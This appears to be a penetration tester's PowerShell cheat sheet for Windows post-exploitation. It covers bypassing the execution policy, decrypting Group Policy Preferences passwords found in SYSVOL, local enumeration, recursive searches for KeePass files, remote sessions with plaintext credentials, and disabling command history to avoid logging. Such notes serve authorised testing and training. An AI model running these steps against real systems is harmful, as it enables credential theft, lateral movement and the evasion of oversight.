powershell -ep bypass
OR
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

# Get Local info:

ENUM SHARES
# Local shares:
get-smbshare
# Remote shares:
get-smbshare -CimSession "fileserver01"
$env:path # see DLL hijacking
# Yes, at powershell:
ls \\dc1.xpto.com\sysvol\xpto.com\
cat \\dc1.xpto.com\sysvol\xpto.com\Policies\oldpolicy\old-policy-backup.xml
# GPP-stored passwords are encrypted with AES-256, the private key has been posted on MSDN, but we can use Kali gpp-decrypt tool to decrypt it:
# gpp-decrypt "+bsY0..d4/KgX...dO/vyepPfAN1zM...QDApgR92JE"

dir env:
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
Get-Process
Get-History
# If have history, where is it stored?
(Get-PSReadlineOption).HistorySavePath
# We can prevent PSReadline by setting the -HistorySaveStyle option to SaveNothing with the Set-PSReadlineOption Cmdlet.

# Local Programs
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Will recursively find kdbx files on C: in powershell:
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xpto -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

# REMOTE SESSIONS
$password = ConvertTo-SecureString "Password123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("superadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
# Check for sessions with no priv:
NetSessionEnum

# PowerShel loggin Script Block? Search the ID:
Get-WinEvent -FilterHashtable @{logname = "Microsoft-Windows-PowerShell/Operational"; id = 4104 } | select -ExpandProperty message
# We can prevent PSReadline by setting the -HistorySaveStyle option to SaveNothing with the Set-PSReadlineOption Cmdlet.
